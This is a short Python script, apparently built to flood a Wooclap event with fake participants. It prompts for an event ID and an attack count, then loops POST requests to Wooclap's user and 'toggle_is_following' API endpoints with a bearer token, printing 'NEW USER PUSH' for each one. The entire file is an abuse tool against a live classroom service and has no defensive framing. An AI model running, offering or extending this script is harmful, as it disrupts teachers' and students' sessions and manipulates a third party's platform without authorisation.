import requests

def attack(TOKEN):
    WOOCLAP_ID = ""
    LOST = ""
    NUMBER_ATTACK = ""

    if WOOCLAP_ID == "":
        WOOCLAP_ID = input("WOOCLAP_ID ?\n> ")

    if NUMBER_ATTACK == "":
        NUMBER_ATTACK = input("NUMBER_ATTACK ?\n> ")

    if LOST == "":
        LOST = input("LOST ? YES or NO\n> ")

    for i in range(int(NUMBER_ATTACK)):

        # TOKEN = generate_token()
        BEARER = f"bearer {TOKEN}"

        requests.post(f"https://app.wooclap.com/api/user?slug={WOOCLAP_ID}", headers={ "authorization": BEARER }).json()

        if LOST.upper() == "YES":
            requests.post(f"https://app.wooclap.com/api/events/{WOOCLAP_ID}/toggle_is_following", headers={ "authorization": BEARER }).json()

        print(f"NEW USER PUSH: {TOKEN}\n")